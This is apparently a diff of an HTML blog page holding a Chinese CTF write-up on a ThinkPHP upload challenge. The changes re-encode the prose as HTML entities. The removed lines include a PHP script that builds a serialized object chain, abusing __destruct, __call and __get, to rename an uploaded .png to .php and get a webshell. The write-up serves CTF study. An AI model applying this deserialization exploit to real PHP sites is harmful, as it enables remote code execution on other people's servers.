}</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_cookie</span><span class="hljs-params">()</span></span>{   </span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&apos;img&apos;</span>]=<span class="hljs-keyword">$this</span>-&gt;img; </span><br><span class="line">        cookie(<span class="hljs-string">&quot;user&quot;</span>,base64_encode(serialize(<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile)),<span class="hljs-number">3600</span>);  </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ext_check</span><span class="hljs-params">()</span></span>{    </span><br><span class="line">        $ext_arr=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;filename);  </span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;ext=end($ext_arr);   </span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext==<span class="hljs-string">&quot;png&quot;</span>){  </span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">        }<span class="hljs-keyword">else</span>{</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($name)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[$name]; </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($name, $arguments)</span>  </span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;{$name}){</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;{<span class="hljs-keyword">$this</span>-&gt;{$name}}($arguments);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x505A;&#x9898;&#x7684;&#x65F6;&#x5019;&#x4E3A;&#x4E86;&#x5E2E;&#x81EA;&#x5DF1;&#x7406;&#x6E05;&#x695A;&#x6E90;&#x7801;&#x903B;&#x8F91;&#xFF0C;&#x5C1D;&#x8BD5;&#x628A;&#x6BCF;&#x4E00;&#x4E2A;&#x8BED;&#x53E5;&#x90FD;&#x6253;&#x4E0A;&#x6CE8;&#x91CA;&#xFF0C;&#x7ED3;&#x679C;&#x8FD8;&#x662F;&#x6CA1;&#x627E;&#x5230;&#x91CD;&#x70B9;&#x3002;</p>
+<p>&#x7531;&#x4E8E;&#x6700;&#x91CD;&#x8981;&#x7684;&#x5C31;&#x662F;&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x76F4;&#x63A5;&#x6765;&#x770B;&#xFF1A;</p>
+<p>upload_img()&#x51FD;&#x6570;&#xFF0C;&#x5F53;&#x6709;&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x7ECF;&#x8FC7;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x6B65;&#x9AA4;&#xFF1A;</p>
 <ol>
-<li>判断是否登录成功</li>
-<li>当文件不为空时，会赋值一个变量filename_tmp为原图片地址，filename为原图片名的md5加密值+”.png”，并调用一个函数来判断是否成功修改filename。</li>
-<li>在判断成功修改filename为.png后缀后，就会原图片名filename_tmp修改为.png后缀的filename。并删除原来的图片。</li>
-<li>更新数据库内用户信息与cookie</li>
+<li>&#x5224;&#x65AD;&#x662F;&#x5426;&#x767B;&#x5F55;&#x6210;&#x529F;</li>
+<li>&#x5F53;&#x6587;&#x4EF6;&#x4E0D;&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x4F1A;&#x8D4B;&#x503C;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;filename_tmp&#x4E3A;&#x539F;&#x56FE;&#x7247;&#x5730;&#x5740;&#xFF0C;filename&#x4E3A;&#x539F;&#x56FE;&#x7247;&#x540D;&#x7684;md5&#x52A0;&#x5BC6;&#x503C;+&#x201D;.png&#x201D;&#xFF0C;&#x5E76;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6210;&#x529F;&#x4FEE;&#x6539;filename&#x3002;</li>
+<li>&#x5728;&#x5224;&#x65AD;&#x6210;&#x529F;&#x4FEE;&#x6539;filename&#x4E3A;.png&#x540E;&#x7F00;&#x540E;&#xFF0C;&#x5C31;&#x4F1A;&#x539F;&#x56FE;&#x7247;&#x540D;filename_tmp&#x4FEE;&#x6539;&#x4E3A;.png&#x540E;&#x7F00;&#x7684;filename&#x3002;&#x5E76;&#x5220;&#x9664;&#x539F;&#x6765;&#x7684;&#x56FE;&#x7247;&#x3002;</li>
+<li>&#x66F4;&#x65B0;&#x6570;&#x636E;&#x5E93;&#x5185;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x4E0E;cookie</li>
 </ol>
-<p>并且，源码的最后还有两个php魔术方法，<code>__get(),__call()</code></p>
+<p>&#x5E76;&#x4E14;&#xFF0C;&#x6E90;&#x7801;&#x7684;&#x6700;&#x540E;&#x8FD8;&#x6709;&#x4E24;&#x4E2A;php&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#xFF0C;<code>__get(),__call()</code></p>
 <ul>
-<li><p>读取不可访问属性的值时，<code>__get()</code> 会被调用。返回except[$被调用的属性]的值</p>
+<li><p>&#x8BFB;&#x53D6;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x5C5E;&#x6027;&#x7684;&#x503C;&#x65F6;&#xFF0C;<code>__get()</code> &#x4F1A;&#x88AB;&#x8C03;&#x7528;&#x3002;&#x8FD4;&#x56DE;except[$&#x88AB;&#x8C03;&#x7528;&#x7684;&#x5C5E;&#x6027;]&#x7684;&#x503C;</p>
 </li>
-<li><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。</p>
-<pre><code>其中：`$this-&gt;{$this-&gt;{$name}}($arguments);`比较绕，
+<li><p>&#x5728;&#x5BF9;&#x8C61;&#x4E2D;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x65B9;&#x6CD5;&#x65F6;&#xFF0C;<code>__call()</code> &#x4F1A;&#x88AB;&#x8C03;&#x7528;&#x3002;</p>
+<pre><code>&#x5176;&#x4E2D;&#xFF1A;`$this-&gt;{$this-&gt;{$name}}($arguments);`&#x6BD4;&#x8F83;&#x7ED5;&#xFF0C;
 
-我们设A为所调用的不可访问的方法名。B为调用方法时所赋值的参数，C为一个和A为一个名字的变量。D为变量C的值。
+&#x6211;&#x4EEC;&#x8BBE;A&#x4E3A;&#x6240;&#x8C03;&#x7528;&#x7684;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x540D;&#x3002;B&#x4E3A;&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#x65F6;&#x6240;&#x8D4B;&#x503C;&#x7684;&#x53C2;&#x6570;&#xFF0C;C&#x4E3A;&#x4E00;&#x4E2A;&#x548C;A&#x4E3A;&#x4E00;&#x4E2A;&#x540D;&#x5B57;&#x7684;&#x53D8;&#x91CF;&#x3002;D&#x4E3A;&#x53D8;&#x91CF;C&#x7684;&#x503C;&#x3002;
 
-那么这个语句就会调用这个函数：D(B)
+&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x5C31;&#x4F1A;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;D(B)
 </code></pre></li>
 </ul>
-<p>从这里来看，题目的解题方法就比较明了了，就是通过构造一个序列化的payload，绕过或者修改上传的图片后缀名为.php。</p>
+<p>&#x4ECE;&#x8FD9;&#x91CC;&#x6765;&#x770B;&#xFF0C;&#x9898;&#x76EE;&#x7684;&#x89E3;&#x9898;&#x65B9;&#x6CD5;&#x5C31;&#x6BD4;&#x8F83;&#x660E;&#x4E86;&#x4E86;&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5E8F;&#x5217;&#x5316;&#x7684;payload&#xFF0C;&#x7ED5;&#x8FC7;&#x6216;&#x8005;&#x4FEE;&#x6539;&#x4E0A;&#x4F20;&#x7684;&#x56FE;&#x7247;&#x540E;&#x7F00;&#x540D;&#x4E3A;.php&#x3002;</p>
 <p><strong>Register.php</strong></p>
-<p>负责注册的页面</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span><br><span class="line">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span><br><span class="line">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span><br><span class="line">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span><br><span class="line">        preg_match($pattern, $email, $matches);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>前面一部分都是对解题没什么太大用处。</p>
-<p>看最后的一个方法，在类创建完毕之后所触发，这里$this-&gt;checker调用了index()，后面可以利用这里来构造payload。</p>
-<h2 id="根据payload来看解题的思路"><a href="#根据payload来看解题的思路" class="headerlink" title="根据payload来看解题的思路"></a>根据payload来看解题的思路</h2><p>生成Payload的脚本:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $checker;</span><br><span class="line">  <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($check)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checker=$check;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">  <span class="keyword">public</span> $ext = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">public</span> $filename_tmp = <span class="string">"./upload/98acc62aa02eda032d1caed497ce72a0/2b4ec354e9c2540ed9bc584cec08c9c0.png"</span>;</span><br><span class="line">  <span class="keyword">public</span> $filename=<span class="string">"./upload/98acc62aa02eda032d1caed497ce72a0/2b4ec354e9c2540ed9bc584cec08c9c0.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在看了payload之后，我整理了一下我自己的思路：</p>
-<p>profile.php里的upload_img函数中有一处复制图片到新地址，并删除原来图片的语句：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);       <span class="comment">//将老图片的地址改为修改后的地址。</span></span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);              <span class="comment">//删除</span></span><br></pre></td></tr></table></figure>
-<p>我们可以利用反序列化，将filename_tmp赋值为.png后缀，将filename赋值为.php后缀。</p>
-<p>这里就会将.png后缀的图片修改为.php并把原来后缀为.png的图片删除。这样就可以在图片中写入一句话进而getshell。</p>
-<p>而要重定义这两个变量，我们就得调用upload_img这个函数并且绕过修改后缀名和判断是否已经修改成功这两个if语句。</p>
-<p>当我们还未上传图片时，<code>if(!empty($_FILES))</code>是直接可以绕过的，这样就不会执行ext_check()这个函数。我们再利用反序列化将$ext赋值为1。就可以绕过这两个if语句了。</p>
-<p>那么问题来了，怎么调用upload_img这个函数呢？我们知道，反序列化是不能够直接调用类里面的函数的。</p>
-<p>还记得前面的两个魔术方法吗？</p>
-<p>从payload脚本当中看，我们将$this-&gt;checker赋值为Profile这个类。</p>
-<p>页面Register.php在调用$this-&gt;checker时的语句为：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里调用了$this-&gt;checker-&gt;index();也就是从Profile类中调用了index()，而Profile类中并没有index()这个函数。</p>
-<p>所以这里就会触发到魔术方法中的<code>__call()</code></p>
-<p>在call方法中，会调用名为变量index的值的方法。而Profile类中没有index这个变量，所以又会触发<code>__get()</code>这个魔术方法。</p>
-<p>在get方法中，会返回except[‘index’]的值，所以我们在构造反序列化时就将其赋值为upload_img。</p>
-<p>这样，就会调用upload_img这个函数了。</p>
-<p>最终的步骤就是：</p>
+<p>&#x8D1F;&#x8D23;&#x6CE8;&#x518C;&#x7684;&#x9875;&#x9762;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;</span><br><span class="line"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line">    <span class="hljs-keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-keyword">new</span> Index();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;checker) {</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check()){</span><br><span class="line">                $curr_url=<span class="hljs-string">&quot;http://&quot;</span>.$_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>].$_SERVER[<span class="hljs-string">&apos;SCRIPT_NAME&apos;</span>].<span class="hljs-string">&quot;/home&quot;</span>;</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;redirect($curr_url,<span class="hljs-number">302</span>);</span><br><span class="line">                <span class="hljs-keyword">exit</span>();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(input(<span class="hljs-string">&quot;post.username&quot;</span>)) &amp;&amp; !<span class="hljs-keyword">empty</span>(input(<span class="hljs-string">&quot;post.email&quot;</span>)) &amp;&amp; !<span class="hljs-keyword">empty</span>(input(<span class="hljs-string">&quot;post.password&quot;</span>))) {</span><br><span class="line">            $email = input(<span class="hljs-string">&quot;post.email&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;addslashes&quot;</span>);</span><br><span class="line">            $password = input(<span class="hljs-string">&quot;post.password&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;addslashes&quot;</span>);</span><br><span class="line">            $username = input(<span class="hljs-string">&quot;post.username&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;addslashes&quot;</span>);</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;check_email($email)) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(db(<span class="hljs-string">&quot;user&quot;</span>)-&gt;where(<span class="hljs-string">&quot;username&quot;</span>, $username)-&gt;find()) &amp;&amp; <span class="hljs-keyword">empty</span>(db(<span class="hljs-string">&quot;user&quot;</span>)-&gt;where(<span class="hljs-string">&quot;email&quot;</span>, $email)-&gt;find())) {</span><br><span class="line">                    $user_info = [<span class="hljs-string">&quot;email&quot;</span> =&gt; $email, <span class="hljs-string">&quot;password&quot;</span> =&gt; md5($password), <span class="hljs-string">&quot;username&quot;</span> =&gt; $username];</span><br><span class="line">                    <span class="hljs-keyword">if</span> (db(<span class="hljs-string">&quot;user&quot;</span>)-&gt;insert($user_info)) {</span><br><span class="line">                        <span class="hljs-keyword">$this</span>-&gt;registed = <span class="hljs-number">1</span>;</span><br><span class="line">                        <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&apos;Registed successful!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>));</span><br><span class="line">                    } <span class="hljs-keyword">else</span> {</span><br><span class="line">                        <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&apos;Registed failed!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>));</span><br><span class="line">                    }</span><br><span class="line">                } <span class="hljs-keyword">else</span> {</span><br><span class="line">                    <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&apos;Account already exists!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>));</span><br><span class="line">                }</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&apos;Email illegal!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>));</span><br><span class="line">            }</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&apos;Something empty!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_email</span><span class="hljs-params">($email)</span></span>{</span><br><span class="line">        $pattern = <span class="hljs-string">&quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/&quot;</span>;</span><br><span class="line">        preg_match($pattern, $email, $matches);</span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($matches)){</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">        }<span class="hljs-keyword">else</span>{</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;registed){</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x524D;&#x9762;&#x4E00;&#x90E8;&#x5206;&#x90FD;&#x662F;&#x5BF9;&#x89E3;&#x9898;&#x6CA1;&#x4EC0;&#x4E48;&#x592A;&#x5927;&#x7528;&#x5904;&#x3002;</p>
